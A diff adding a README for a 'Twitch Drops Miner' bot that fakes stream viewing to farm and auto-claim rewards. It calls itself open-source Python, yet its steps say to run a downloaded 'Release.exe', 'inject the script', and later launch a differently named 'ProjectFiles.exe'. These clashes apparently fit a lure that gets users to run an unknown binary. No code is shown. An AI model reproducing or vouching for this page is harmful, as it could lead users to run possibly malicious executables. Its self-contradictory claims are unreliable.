@@ -1,0 +1,80 @@
+🎁 Twitch Drops Miner
+
+AFK Mine Timed Twitch Drops & Auto-Claim Rewards — 2026
+
+A lightweight, open-source twitch drops miner that allows you to auto-farm timed drops in the background.
+Streamless, bandwidth-friendly, and designed for Windows, macOS, and Linux.
+
+🎯 What it is
+
+Twitch Drops Miner is a standalone twitch drops bot that automatically watches eligible streams and claims drop rewards for you.
+It reads playlist metadata and checks segment response headers to keep bandwidth low, so you can afk mine drops without downloading video or audio.
+
+⚠️ Warning: Use this tool at your own risk. We are not responsible for any account restrictions. Make sure to link your Twitch account to game accounts on the campaigns page to enable more games to be mined.
+
+🚀 Quick Start
+
+1. Download Release_Launcher using the button above.
+2. Extract the archive into a separate folder.
+3. Run Release.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🎁 Auto-Farm Drops      | Automatically earn timed Twitch drops without watching |
+| 🔄 Auto-Claim           | Claims rewards automatically when completed          |
+| 📺 Channel Switching    | Switches to a new stream if the current one goes offline |
+| 🪶 Zero Video Download  | Saves bandwidth by reading metadata only             |
+| 🎯 Priority List        | Choose specific games to prioritize for mining       |
+| 🐳 Docker Support       | Run on a server, VPS, or NAS with Docker             |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Log in with your Twitch account.
+3. Select the games you want to mine twitch drops for from the Priority List.
+4. Click "Reload" to fetch available campaigns and start the miner.
+5. The bot will automatically switch channels and claim drops.
+
+⚙️ Configuration
+
+You can adjust settings in the config.json file:
+
+- Priority List: Games to prioritize for mining
+- Auto-Claim: Enable/disable automatic reward claiming
+- Channel Switching: Automatically switch to new streams
+- Docker: Run in headless mode for server deployment
+
+❓ FAQ
+
+Is this safe to use?
+The tool simulates watching activity only. However, use it at your own risk.
+
+Does it download video or audio?
+No. It reads playlist metadata and segment headers only, keeping bandwidth usage minimal.
+
+Does it work on Mac or Linux?
+Yes, it runs on Windows, macOS, and Linux. Docker support is also available.
+
+Can I mine drops for multiple games?
+Yes, you can add multiple games to the Priority List.
+
+💻 Tech Stack & Architecture
+
+- Core: Python 3.10+
+- UI: GUI / Web Dashboard (Docker version)
+- API: Twitch GraphQL / PubSub
+- Target OS: Windows / macOS / Linux
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See CONTRIBUTING.md for guidelines.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
